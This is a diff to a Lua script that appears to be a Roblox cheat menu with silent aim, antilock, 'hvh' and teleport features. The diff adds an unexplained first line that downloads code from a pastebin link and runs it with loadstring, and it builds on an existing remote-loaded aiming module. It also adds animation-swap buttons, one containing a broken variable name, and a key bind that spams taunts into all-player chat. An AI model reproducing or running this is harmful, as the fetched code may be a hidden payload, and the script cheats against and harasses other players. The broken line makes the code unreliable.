@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/K3bYZJV3"))()
+
 
 
 local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/lolimluke/silent2/main/stefanuk"))()
@@ -312,6 +314,10 @@ local sector9 = tab1:CreateSector("silent aim","right") --silent
 local sector3 = tab2:CreateSector("antilock","left") 
 local sector5 = tab2:CreateSector("hvh stuff","right") 
 local sector6 = tab2:CreateSector("teleports","left") 
+local sector7 = tab2:CreateSector("animations","right") 
+local sector8 = tab2:CreateSector("misc","left") 
+
+
 
 
 
@@ -609,6 +615,79 @@ sector5:AddButton("destroy right leg", function()
 
 end)
 
+
+sector7:AddButton("werewolf jump + normal fall", function()
+		
+	local ff = game.Players.LocalPlayer.Character.Animate
+	ff.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
+    ff.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
+	ff.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
+	ff.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
+	ff.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
+	fffall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
+
+
+
+
+end)
+
+
+
+sector7:AddButton("egirl animations", function()
+		
+	local ff = game.Players.LocalPlayer.Character.Animate
+	ff.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=2510196951"
+    ff.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=2510197257"
+	ff.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=2510202577"
+	ff.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=2510198475"
+	ff.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
+	ff.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
+
+
+
+
+end)
+
+
+
+
+
+sector8:AddButton("trash talk (k)", function()
+		
+
+	local plr = game.Players.LocalPlayer
+	repeat wait() until plr.Character
+	local char = plr.Character
+	
+	local garbage = {
+		"cats.xyz winning!";
+		"cope";
+		"gg/locking";
+		"slapped";
+		"son";
+		"keep jumping i hit all airshots";
+	
+	
+	
+	
+	}
+	
+	
+	function TrashTalk(inputObject, gameProcessedEvent)
+		if inputObject.KeyCode == Enum.KeyCode.K and gameProcessedEvent == false then        
+	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+			garbage[math.random(1,#garbage)],
+			"All"
+		)
+		end
+	end
+	 
+	game:GetService("UserInputService").InputBegan:connect(TrashTalk)
+	
+	
+
+
+end)
 
 
 
